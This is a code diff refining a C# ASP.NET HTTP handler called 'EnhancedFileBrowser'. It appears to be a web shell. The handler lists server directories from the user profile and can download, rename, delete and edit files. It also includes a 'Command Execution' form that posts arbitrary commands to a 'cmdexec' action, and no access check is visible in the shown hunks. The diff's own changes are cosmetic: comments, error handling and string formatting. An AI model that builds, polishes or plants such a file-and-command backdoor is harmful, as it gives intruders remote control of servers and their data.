@@ -11,10 +11,11 @@ public class EnhancedFileBrowser : IHttpHandler
     {
         context.Response.ContentType = "text/html; charset=utf-8";
 
+        // Fetch action & path from request
         string action = context.Request["action"];
         string currentPath = context.Request["path"];
 
-        // Validate and set default path if needed
+        // Validate currentPath: use default folder if invalid
         if (string.IsNullOrWhiteSpace(currentPath) || !Directory.Exists(currentPath))
         {
             currentPath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
@@ -82,7 +83,7 @@ public class EnhancedFileBrowser : IHttpHandler
     private string PerformActions(HttpContext context, string action, string currentPath, out string updatedPath)
     {
         updatedPath = currentPath;
-        if (string.IsNullOrEmpty(action)) return null;
+        if (string.IsNullOrWhiteSpace(action)) return null;
 
         try
         {
@@ -134,7 +135,7 @@ public class EnhancedFileBrowser : IHttpHandler
             }
             else if (action == "editform")
             {
-                return null; // handled in render
+                return null; // handled later
             }
             else if (action == "saveedit")
             {
@@ -171,8 +172,7 @@ public class EnhancedFileBrowser : IHttpHandler
             }
             else if (action == "cmdexec")
             {
-                // handled in render
-                return null;
+                return null; // handled in render
             }
         }
         catch (Exception ex)
@@ -201,34 +201,41 @@ public class EnhancedFileBrowser : IHttpHandler
 
         sb.Append("<table><thead><tr><th>Name</th><th>Size</th><th>Last Modified</th><th>Actions</th></tr></thead><tbody>");
 
-        foreach (var dir in Directory.GetDirectories(path))
+        try
         {
-            var dirInfo = new DirectoryInfo(dir);
-            sb.Append("<tr>");
-            sb.Append($"<td><b><a href='?path={HttpUtility.UrlEncode(dir)}'>{HttpUtility.HtmlEncode(dirInfo.Name)}</a></b></td>");
-            sb.Append("<td>--</td>");
-            sb.Append($"<td>{dirInfo.LastWriteTime}</td>");
-            sb.Append("<td>");
-            sb.Append($"<button class='button' onclick=\"renameFile('{HttpUtility.JavaScriptStringEncode(dir)}')\">Rename</button>");
-            sb.Append($"<button class='button' onclick=\"confirmDelete('{HttpUtility.JavaScriptStringEncode(dir)}')\">Delete</button>");
-            sb.Append("</td>");
-            sb.Append("</tr>");
-        }
+            foreach (var dir in Directory.GetDirectories(path))
+            {
+                var dirInfo = new DirectoryInfo(dir);
+                sb.Append("<tr>");
+                sb.Append($"<td><b><a href='?path={HttpUtility.UrlEncode(dir)}'>{HttpUtility.HtmlEncode(dirInfo.Name)}</a></b></td>");
+                sb.Append("<td>--</td>");
+                sb.Append($"<td>{dirInfo.LastWriteTime}</td>");
+                sb.Append("<td>");
+                sb.Append($"<button class='button' onclick=\"renameFile('{HttpUtility.JavaScriptStringEncode(dir)}')\">Rename</button>");
+                sb.Append($"<button class='button' onclick=\"confirmDelete('{HttpUtility.JavaScriptStringEncode(dir)}')\">Delete</button>");
+                sb.Append("</td>");
+                sb.Append("</tr>");
+            }
 
-        foreach (var file in Directory.GetFiles(path))
+            foreach (var file in Directory.GetFiles(path))
+            {
+                var fileInfo = new FileInfo(file);
+                sb.Append("<tr>");
+                sb.Append($"<td><a href='?action=editform&path={HttpUtility.UrlEncode(file)}'>{HttpUtility.HtmlEncode(fileInfo.Name)}</a></td>");
+                sb.Append($"<td>{FormatSize(fileInfo.Length)}</td>");
+                sb.Append($"<td>{fileInfo.LastWriteTime}</td>");
+                sb.Append("<td>");
+                sb.Append($"<a class='button' href='?action=download&path={HttpUtility.UrlEncode(file)}'>Download</a>");
+                sb.Append($"<button class='button' onclick=\"renameFile('{HttpUtility.JavaScriptStringEncode(file)}')\">Rename</button>");
+                sb.Append($"<button class='button' onclick=\"confirmDelete('{HttpUtility.JavaScriptStringEncode(file)}')\">Delete</button>");
+                sb.Append($"<button class='button' onclick=\"editFile('{HttpUtility.JavaScriptStringEncode(file)}')\">Edit</button>");
+                sb.Append("</td>");
+                sb.Append("</tr>");
+            }
+        }
+        catch (Exception ex)
         {
-            var fileInfo = new FileInfo(file);
-            sb.Append("<tr>");
-            sb.Append($"<td><a href='?action=editform&path={HttpUtility.UrlEncode(file)}'>{HttpUtility.HtmlEncode(fileInfo.Name)}</a></td>");
-            sb.Append($"<td>{FormatSize(fileInfo.Length)}</td>");
-            sb.Append($"<td>{fileInfo.LastWriteTime}</td>");
-            sb.Append("<td>");
-            sb.Append($"<a class='button' href='?action=download&path={HttpUtility.UrlEncode(file)}'>Download</a>");
-            sb.Append($"<button class='button' onclick=\"renameFile('{HttpUtility.JavaScriptStringEncode(file)}')\">Rename</button>");
-            sb.Append($"<button class='button' onclick=\"confirmDelete('{HttpUtility.JavaScriptStringEncode(file)}')\">Delete</button>");
-            sb.Append($"<button class='button' onclick=\"editFile('{HttpUtility.JavaScriptStringEncode(file)}')\">Edit</button>");
-            sb.Append("</td>");
-            sb.Append("</tr>");
+            sb.Append($"<tr><td colspan='4' class='error'>Error reading directory: {HttpUtility.HtmlEncode(ex.Message)}</td></tr>");
         }
 
         sb.Append("</tbody></table>");
@@ -262,7 +269,7 @@ public class EnhancedFileBrowser : IHttpHandler
     {
         StringBuilder sb = new StringBuilder();
         sb.Append("<h2>Command Execution</h2>");
-        sb.Append($@"<form method='post'>
+        sb.Append(@"<form method='post'>
             <input type='hidden' name='action' value='cmdexec'/>
             <textarea name='cmdtext' rows='10' cols='80' style='width:100%;font-family:monospace;' placeholder='Enter command here'></textarea><br/>
             <input type='submit' value='Run Command'/>
@@ -331,7 +338,7 @@ public class EnhancedFileBrowser : IHttpHandler
             context.Response.TransmitFile(file);
             context.Response.Flush();
             context.Response.End();
-            return null; // This line will not be reached after Response.End()
+            return null; // will never reach here due to Response.End()
         }
         catch (Exception ex)
         {
